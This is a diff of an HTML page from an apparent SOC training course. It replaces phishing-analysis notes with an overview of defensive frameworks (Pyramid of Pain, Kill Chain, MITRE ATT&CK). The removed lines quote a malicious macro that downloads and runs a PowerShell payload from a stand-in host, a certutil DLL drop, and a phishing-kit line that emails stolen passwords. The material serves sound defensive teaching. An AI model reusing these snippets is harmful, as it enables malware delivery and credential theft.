@@ -1,40 +1,25 @@
 <div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
-<h6 class="text-danger mb-3"><i class="bi bi-book me-2"></i>Elaborated Notes with Examples</h6>
+<h6 class="text-warning mb-3"><i class="bi bi-book me-2"></i>Module 4: Cyber Defence Frameworks</h6>
 
-<h6 class="text-danger mt-3">1. SPF, DKIM, DMARC Headers</h6>
-<p>Email authentication headers verify sender legitimacy. SPF checks if the sending IP is authorized by the domain's DNS TXT record. DKIM uses a cryptographic signature to verify email integrity. DMARC tells receivers how to handle failures (none/quarantine/reject).</p>
+<h6 class="text-warning mt-3">Sub-Domains / Rooms</h6>
+<ul style="color:#c0d0e0;">
+  <li><b>Pyramid of Pain</b> — A model showing how difficult it is for attackers to change different types of IOCs: hashes (easy) → IPs → domains → tools → TTPs (hard).</li>
+  <li><b>Cyber Kill Chain</b> — 7 phases of an attack: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives.</li>
+  <li><b>Unified Kill Chain</b> — Combines multiple kill chain models into a comprehensive framework covering the entire attack lifecycle.</li>
+  <li><b>MITRE ATT&CK</b> — Industry-standard knowledge base of adversary tactics and techniques mapped to real-world attacks.</li>
+  <li><b>Summit</b> — Apply frameworks to analyze a real-world breach scenario.</li>
+  <li><b>Eviction</b> — Practice evicting an attacker by applying defensive frameworks.</li>
+</ul>
+
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> A phishing email claims to be from <code>paypal.com</code> but headers show:<br>
-<code>Authentication-Results: spf=softfail (sender IP 185.130.5.201 is not allowed)</code><br>
-<code>dkim=fail (signature did not verify)</code><br>
-<code>dmarc=fail (p=reject)</code><br>
-The <code>Return-Path</code> is <code>bounce@evil-phish.com</code> and <code>Received-SPF: None</code>. The analyst blocks the sending IP and domain, and updates the mail gateway rule to strip attachments from domains with no DMARC policy.
+<b>Example:</b> A SOC analyst maps a ransomware alert to MITRE ATT&CK: T1486 (Data Encrypted for Impact). Then traces back through the Cyber Kill Chain: initial access via T1566 (Phishing) → execution via T1059 (PowerShell) → persistence via T1547 (Registry Run Keys). The Pyramid of Pain shows that blocking the hash is easy, but the attacker can change it. Blocking the TTP (PowerShell abuse) is harder and more effective.
 </div>
 
-<h6 class="text-danger mt-3">2. URL Analysis</h6>
-<p>Suspicious URLs in emails should be defanged, analyzed via sandbox (URLScan.io, VirusTotal), and checked for redirect chains, typosquatting, and shortened links (bit.ly, t.co).</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> The email body contains <code>&lt;a href="hxxp://bit[.]ly/3xK9mN2"&gt;Click to Verify&lt;/a&gt;</code>. After defanging, the analyst submits to URLScan.io. The redirect chain resolves: bit.ly -> hxxp://evil[.]com/login.php?email=phished%40corp.com. The final page is a cloned Microsoft 365 login page. The domain <code>evil[.]com</code> was registered 2 days ago with privacy protection. The page uses a self-signed TLS certificate.
-</div>
-
-<h6 class="text-danger mt-3">3. Attachment Analysis (Macros)</h6>
-<p>Malicious attachments include .docm, .xlsm, .js, .vbs, .wsf, .hta, and archive bombs. Macros in Office documents use VBA to download/execute payloads. Static analysis with oledump and dynamic analysis in a sandbox are critical.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> The attachment <code>Invoice_2026.docm</code> contains auto-executing VBA macro at stream <code>M 7</code> (from oledump):<br>
-<code>Private Sub Document_Open()</code><br>
-<code>&nbsp;&nbsp;Set obj = CreateObject("Wscript.Shell")</code><br>
-<code>&nbsp;&nbsp;obj.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4..."</code><br>
-<code>End Sub</code><br>
-The base64 decodes to <code>IEX (New-Object Net.WebClient).DownloadString('hxxp://evil/payload.ps1')</code>. The macro also calls <code>Shell("cmd /c certutil -urlcache -f hxxp://evil/dll.dll %TEMP%\msi.dll")</code> to drop a side-loaded DLL.
-</div>
-
-<h6 class="text-danger mt-3">4. Phishing Kits</h6>
-<p>Phishing kits are pre-packaged sets of HTML, PHP, CSS, and JavaScript files that replicate legitimate login pages. They often include telemetry code and exfiltrate credentials via email or PHP POST. Analyzing the kit reveals the attacker's email address and exfiltration endpoint.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> The phishing page <code>login.php</code> contains:<br>
-<code>&lt;form method="POST" action="send.php"&gt;</code><br>
-In <code>send.php</code>: <code>mail("attacker@tutanota.com", "Creds: ".$_POST['email'], $_POST['password']);</code><br>
-The kit also writes captured credentials to a text file on the server. The analyst identifies the kit as "16Shop" targeting Microsoft 365 users, and uses this intel to block the attacker email and search for related domains via passive DNS.
-</div>
-
+<h6 class="text-warning mt-3">Key Skills Learned</h6>
+<ul style="color:#c0d0e0;">
+  <li>Mapping attacks to MITRE ATT&CK techniques</li>
+  <li>Understanding kill chain phases for detection</li>
+  <li>Using Pyramid of Pain for defense strategy</li>
+  <li>Analyzing attacks through multiple frameworks</li>
+</ul>
 </div>
